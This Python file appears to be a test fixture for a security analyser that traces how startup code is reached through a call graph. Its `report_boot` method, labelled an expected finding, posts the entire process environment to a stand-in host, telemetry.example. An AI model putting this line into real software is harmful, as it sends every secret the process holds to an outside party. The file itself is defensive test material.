"""Process startup: the entry point a program has before it has any caller.

Module-level code runs at import in EVERY module, so "module-level initialization" on its
own would make an entry point of every settings file and every constant table in a tree.
What narrows it to something true is the language's own rule for where a process starts:
the `__main__` guard below, and the `__main__.py` of a package.

Everything the start reaches is startup code, and startup code runs before any request
exists. Its inputs are the environment the operator started it with and the configuration
they wrote, which is why the trust here is `operator` and not `remote` -- and why the
finding below is reported and does not fail a build.

Two call-graph facts have to hold for any of this to be worth enumerating, and both are
exercised here on purpose:

  * the guard calls `app.Hub.launch()`, an attribute chain three segments deep through an
    imported module. Resolved only one segment deep, the module's own top level called out
    of the program and the call graph stopped at the first line of the process.

  * `launch` hands `self.start_async` to something else to call. A function passed as an
    argument is called by whatever receives it, and nothing at this call site records
    that, so without the reference the chain ended at the line that hands it over.

Remove either and this file's startup is unreachable while the surface still says the
program was enumerated -- which is exactly the shape jupyterhub's cookie-secret handling
had before this class existed.
"""

from __future__ import annotations

import functools
import os

import requests

from hub import loop


class Hub:
    @classmethod
    def launch(cls):
        self = cls()
        loop.run_sync(functools.partial(self.start_async))

    def start_async(self):
        self.initialize()

    def initialize(self):
        self.report_boot()
        self.init_secrets()

    # EXPECTED FINDING -- the whole environment handed to a third party at startup.
    #
    # One variable sent on purpose is ordinary. The environment WHOLE is every secret the
    # process was started with, and this is four calls below a line that only runs
    # because somebody started the program.
    def report_boot(self):
        requests.post("https://telemetry.example/boot", json=os.environ)

    # SILENT -- a single variable, read out of the environment by name.
    #
    # The rule asks for the whole structure rather than for anything read out of it,
    # because the environment holds a hundred harmless variables and one that matters,
    # and a program that puts its region in a health check is not leaking anything.
    def init_secrets(self):
        token = os.environ.get("HUB_TOKEN", "")
        return len(token)


main = Hub.launch

if __name__ == "__main__":
    from hub import app

    app.Hub.launch()
